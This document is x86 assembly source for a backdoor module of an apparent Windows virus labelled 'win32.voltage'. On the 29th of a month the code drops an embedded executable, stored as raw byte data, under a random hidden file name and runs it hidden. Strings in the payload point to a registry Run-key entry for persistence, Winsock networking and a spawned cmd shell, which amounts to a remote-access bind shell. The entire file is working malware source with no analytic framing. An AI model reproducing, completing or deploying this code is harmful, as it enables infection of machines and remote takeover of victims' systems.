;win32.voltage backdoor module

Backdoor:
	call	bDelta
bDelta:	pop	ebp
	sub	ebp,offset bDelta			;get delta offset
	
	lea	eax,[ebp + SYSTEMTIME]
	push	eax
	call	[ebp + GetLocalTime]			;get local time
	
	cmp	word ptr [ebp + wDay],1dh		;its the 29 of the month ?
	jne	@ExitB

	call	InitRandomNumber			;init random number generator
	
	mov	ecx,7h
	lea	edi,[ebp + backdoor_filename]
@xRandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@xRandLetter				;gen random name for the backdoor

	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN
	push	OPEN_ALWAYS
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_WRITE
	lea	eax,[ebp + backdoor_filename]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	@ExitB
	
	push	eax					;push file handle
	push	0h
	call	pushNBW
	dd	0
pushNBW:push	SizeOfBackdoor
	lea	ebx,[ebp + BackdoorStart]
	push	ebx
	push	eax
	call	[ebp + WriteFile]			;write backdoor file
	
	
	call	[ebp + CloseHandle]			;close backdoor file
	

	push	0h					;SW_HIDE
	lea	eax,[ebp + backdoor_filename]
	push	eax
	call	[ebp + WinExec]				;execute backdoor

@ExitB:	push	eax
	call	[ebp + ExitThread]
	
	backdoor_filename	db	"Voltage.exe",0	;backdoor file name

BackdoorStart:	

db 04dh,05ah,090h,000h,003h,000h,000h,000h,004h,000h,000h,000h,0ffh,0ffh,000h
db 000h,0b8h,000h,000h,000h,000h,000h,000h,000h,040h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 0c8h,000h,000h,000h,00eh,01fh,0bah,00eh,000h,0b4h,009h,0cdh,021h,0b8h,001h
db 04ch,0cdh,021h,054h,068h,069h,073h,020h,070h,072h,06fh,067h,072h,061h,06dh
db 020h,063h,061h,06eh,06eh,06fh,074h,020h,062h,065h,020h,072h,075h,06eh,020h
db 069h,06eh,020h,044h,04fh,053h,020h,06dh,06fh,064h,065h,02eh,00dh,00dh,00ah
db 024h,000h,000h,000h,000h,000h,000h,000h,07dh,010h,065h,0e1h,039h,071h,00bh
db 0b2h,039h,071h,00bh,0b2h,039h,071h,00bh,0b2h,039h,071h,00ah,0b2h,034h,071h
db 00bh,0b2h,05bh,06eh,018h,0b2h,03eh,071h,00bh,0b2h,03fh,052h,000h,0b2h,03bh
db 071h,00bh,0b2h,052h,069h,063h,068h,039h,071h,00bh,0b2h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,050h,045h,000h,000h,04ch,001h,002h,000h,06fh,090h
db 01ch,042h,000h,000h,000h,000h,000h,000h,000h,000h,0e0h,000h,00fh,001h,00bh
db 001h,006h,000h,000h,000h,000h,000h,000h,006h,000h,000h,000h,000h,000h,000h
db 080h,020h,000h,000h,000h,010h,000h,000h,000h,010h,000h,000h,000h,000h,040h
db 000h,000h,010h,000h,000h,000h,002h,000h,000h,004h,000h,000h,000h,000h,000h
db 000h,000h,004h,000h,000h,000h,000h,000h,000h,000h,000h,030h,000h,000h,000h
db 004h,000h,000h,000h,000h,000h,000h,002h,000h,000h,000h,000h,000h,010h,000h
db 000h,010h,000h,000h,000h,000h,010h,000h,000h,010h,000h,000h,000h,000h,000h
db 000h,010h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,040h,010h
db 000h,000h,050h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,010h,000h,000h
db 040h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,02eh,072h
db 064h,061h,074h,061h,000h,000h,066h,001h,000h,000h,000h,010h,000h,000h,000h
db 002h,000h,000h,000h,004h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,040h,000h,000h,040h,02eh,064h,061h,074h,061h,000h,000h
db 000h,050h,002h,000h,000h,000h,020h,000h,000h,000h,004h,000h,000h,000h,006h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,040h
db 000h,000h,0c0h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,03ch,011h,000h,000h,02ah,011h,000h,000h,01ch,011h,000h
db 000h,000h,000h,000h,000h,0f8h,010h,000h,000h,0e6h,010h,000h,000h,0d0h,010h
db 000h,000h,000h,000h,000h,000h,003h,000h,000h,080h,00dh,000h,000h,080h,001h
db 000h,000h,080h,002h,000h,000h,080h,009h,000h,000h,080h,017h,000h,000h,080h
db 073h,000h,000h,080h,000h,000h,000h,000h,0a0h,010h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,00eh,011h,000h,000h,010h,010h,000h,000h,090h,010h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,04ch,011h,000h,000h,000h
db 010h,000h,000h,0b0h,010h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 05ah,011h,000h,000h,020h,010h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,03ch,011h
db 000h,000h,02ah,011h,000h,000h,01ch,011h,000h,000h,000h,000h,000h,000h,0f8h
db 010h,000h,000h,0e6h,010h,000h,000h,0d0h,010h,000h,000h,000h,000h,000h,000h
db 003h,000h,000h,080h,00dh,000h,000h,080h,001h,000h,000h,080h,002h,000h,000h
db 080h,009h,000h,000h,080h,017h,000h,000h,080h,073h,000h,000h,080h,000h,000h
db 000h,000h,0ceh,002h,057h,061h,069h,074h,046h,06fh,072h,053h,069h,06eh,067h
db 06ch,065h,04fh,062h,06ah,065h,063h,074h,000h,044h,000h,043h,072h,065h,061h
db 074h,065h,050h,072h,06fh,063h,065h,073h,073h,041h,000h,000h,024h,001h,047h
db 065h,074h,04dh,06fh,064h,075h,06ch,065h,046h,069h,06ch,065h,04eh,061h,06dh
db 065h,041h,000h,000h,04bh,045h,052h,04eh,045h,04ch,033h,032h,02eh,064h,06ch
db 06ch,000h,000h,05bh,001h,052h,065h,067h,043h,06ch,06fh,073h,065h,04bh,065h
db 079h,000h,086h,001h,052h,065h,067h,053h,065h,074h,056h,061h,06ch,075h,065h
db 045h,078h,041h,000h,000h,072h,001h,052h,065h,067h,04fh,070h,065h,06eh,04bh
db 065h,079h,045h,078h,041h,000h,041h,044h,056h,041h,050h,049h,033h,032h,02eh
db 064h,06ch,06ch,000h,000h,057h,053h,032h,05fh,033h,032h,02eh,064h,06ch,06ch
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,063h,06dh,064h,000h,053h,074h,061h,072h,074h
db 000h,000h,000h,053h,059h,053h,054h,045h,04dh,05ch,043h,075h,072h,072h,065h
db 06eh,074h,043h,06fh,06eh,074h,072h,06fh,06ch,053h,065h,074h,05ch,053h,065h
db 072h,076h,069h,063h,065h,073h,05ch,053h,068h,061h,072h,065h,064h,041h,063h
db 063h,065h,073h,073h,000h,000h,056h,06fh,06ch,074h,061h,067h,065h,020h,04dh
db 061h,06eh,061h,067h,065h,072h,000h,053h,06fh,066h,074h,077h,061h,072h,065h
db 05ch,04dh,069h,063h,072h,06fh,073h,06fh,066h,074h,05ch,057h,069h,06eh,064h
db 06fh,077h,073h,05ch,043h,075h,072h,072h,065h,06eh,074h,056h,065h,072h,073h
db 069h,06fh,06eh,05ch,052h,075h,06eh,000h,000h,000h,000h,000h,000h,000h,081h
db 0ech,000h,003h,000h,000h,053h,055h,056h,057h,033h,0dbh,0b9h,010h,000h,000h
db 000h,033h,0c0h,08dh,07ch,024h,03ch,089h,05ch,024h,038h,068h,004h,001h,000h
db 000h,0f3h,0abh,089h,044h,024h,020h,08dh,08ch,024h,080h,000h,000h,000h,089h
db 044h,024h,024h,051h,053h,0c7h,044h,024h,020h,004h,000h,000h,000h,089h,05ch
db 024h,024h,089h,044h,024h,030h,0ffh,015h,010h,010h,040h,000h,08bh,035h,000h
db 010h,040h,000h,08dh,054h,024h,010h,052h,068h,006h,000h,002h,000h,053h,068h
db 04ch,020h,040h,000h,068h,002h,000h,000h,080h,0ffh,0d6h,08bh,03dh,004h,010h
db 040h,000h,08bh,02dh,008h,010h,040h,000h,085h,0c0h,075h,020h,08bh,04ch,024h
db 010h,08dh,044h,024h,07ch,068h,004h,001h,000h,000h,050h,06ah,001h,053h,068h
db 03ch,020h,040h,000h,051h,0ffh,0d7h,08bh,054h,024h,010h,052h,0ffh,0d5h,08dh
db 044h,024h,010h,050h,068h,006h,000h,002h,000h,053h,068h,00ch,020h,040h,000h
db 068h,002h,000h,000h,080h,0ffh,0d6h,085h,0c0h,075h,01dh,08bh,054h,024h,010h
db 08dh,04ch,024h,014h,06ah,004h,051h,06ah,004h,053h,068h,004h,020h,040h,000h
db 052h,0ffh,0d7h,08bh,044h,024h,010h,050h,0ffh,0d5h,08dh,08ch,024h,080h,001h
db 000h,000h,051h,068h,001h,001h,000h,000h,0ffh,015h,038h,010h,040h,000h,085h
db 0c0h,00fh,085h,0d3h,000h,000h,000h,06ah,006h,06ah,001h,06ah,002h,0ffh,015h
db 034h,010h,040h,000h,08bh,0f8h,083h,0ffh,0ffh,00fh,084h,0bch,000h,000h,000h
db 068h,09ah,002h,000h,000h,0ffh,015h,030h,010h,040h,000h,08dh,054h,024h,028h
db 06ah,010h,052h,057h,066h,089h,044h,024h,036h,066h,0c7h,044h,024h,034h,002h
db 000h,089h,05ch,024h,038h,0ffh,015h,02ch,010h,040h,000h,083h,0f8h,0ffh,00fh
db 084h,08ah,000h,000h,000h,08bh,01dh,028h,010h,040h,000h,08bh,02dh,014h,010h
db 040h,000h,06ah,001h,057h,0ffh,015h,024h,010h,040h,000h,083h,0f8h,0ffh,074h
db 0f2h,06ah,000h,06ah,000h,057h,0ffh,0d3h,08bh,0f0h,08dh,044h,024h,018h,08dh
db 04ch,024h,038h,050h,051h,06ah,000h,06ah,000h,06ah,000h,06ah,001h,06ah,000h
db 06ah,000h,068h,000h,020h,040h,000h,06ah,000h,0c7h,044h,024h,060h,044h,000h
db 000h,000h,089h,0b4h,024h,0a0h,000h,000h,000h,089h,0b4h,024h,098h,000h,000h
db 000h,089h,0b4h,024h,09ch,000h,000h,000h,0c7h,084h,024h,08ch,000h,000h,000h
db 001h,001h,000h,000h,066h,0c7h,084h,024h,090h,000h,000h,000h,000h,000h,0ffh
db 0d5h,06ah,0ffh,08bh,054h,024h,01ch,052h,0ffh,015h,018h,010h,040h,000h,056h
db 0ffh,015h,020h,010h,040h,000h,0ebh,082h,05fh,05eh,05dh,033h,0c0h,05bh,081h
db 0c4h,000h,003h,000h,000h,0c2h,010h,000h,090h,090h,090h,090h,090h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h


SizeOfBackdoor		equ	($-BackdoorStart)